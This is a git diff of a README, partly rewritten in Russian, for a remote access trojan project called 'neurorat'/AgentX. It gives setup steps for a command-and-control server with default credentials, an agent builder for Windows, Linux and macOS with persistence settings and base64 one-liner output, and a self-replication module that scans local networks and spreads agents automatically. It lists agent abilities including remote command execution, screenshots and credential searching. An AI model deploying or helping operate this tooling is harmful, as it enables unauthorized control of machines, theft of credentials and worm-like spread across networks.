@@ -52,40 +52,70 @@ For detailed architectural information, see [Architecture Documentation](archite
 
 ### Prerequisites
 
-- Python 3.9+
+- Python 3.8+
 - Git
-- virtualenv (recommended)
+- pip (менеджер пакетов Python)
 
-### C2 Server Setup
-
+### Установка из GitHub
 ```bash
-# Clone the repository
-git clone https://github.com/your-repository/neurorat.git
-cd neurorat
+# Клонируем репозиторий
+git clone https://github.com/Personaz1/AgentX.git
+cd AgentX
 
-# Create and activate virtual environment
-python -m venv venv
-source venv/bin/activate  # On Windows: venv\Scripts\activate
+# Устанавливаем зависимости
+pip3 install fastapi uvicorn jinja2 python-multipart pillow psutil
 
-# Install dependencies
-pip install -r requirements.txt
-
-# Start the server
-python server_monitor.py
+# Запускаем сервер
+python3 server_api.py
 ```
 
-### Agent Deployment
+После запуска сервер будет доступен по адресу http://localhost:8088
+- Логин: `admin`
+- Пароль: `neurorat`
 
+### Доступные модули
+
+- **C2 Сервер**: Центральный сервер управления и контроля
+- **Билдер агентов**: Создает кастомизированные агенты для различных ОС
+- **Модуль саморепликации**: Автоматически сканирует сеть и распространяет агенты
+- **Веб-интерфейс**: Управление агентами через современный веб-интерфейс
+
+### Возможности агента
+
+- Сбор системной информации
+- Выполнение команд
+- Захват скриншотов
+- Поиск уязвимостей
+- Мониторинг процессов
+- Поиск файлов и учетных данных
+
+## Билдер и саморепликация
+
+Доступ к билдеру: http://localhost:8088/builder
+
+Билдер позволяет:
+1. Создавать настроенных агентов для Windows, Linux и macOS
+2. Настраивать параметры персистентности
+3. Указывать адрес и порт C2 сервера
+
+Модуль саморепликации:
+1. Сканирует локальную сеть
+2. Обнаруживает открытые порты и сервисы
+3. Автоматически распространяет агенты на найденные системы
+
+## Использование Docker для разработки
+
+Для использования в контейнере (только для тестирования и разработки):
 ```bash
-# Build agent for Windows (EXE)
-python build_agent.py --server-host your.server.com --server-port 443 --output dist --type exe
-
-# Build agent for any platform (ZIP)
-python build_agent.py --server-host your.server.com --server-port 443 --output dist --type zip
-
-# Generate one-liner for quick deployment
-python build_agent.py --server-host your.server.com --server-port 443 --output dist --type base64
+docker build -t neurorat .
+docker run -p 8088:8088 neurorat
 ```
+
+## Структура проекта
+
+- `server_api.py` - Основной C2 сервер
+- `templates/` - HTML шаблоны веб-интерфейса
+- `minimal_*.py` - Минимальные агенты для разных ОС
 
 ## Usage
 
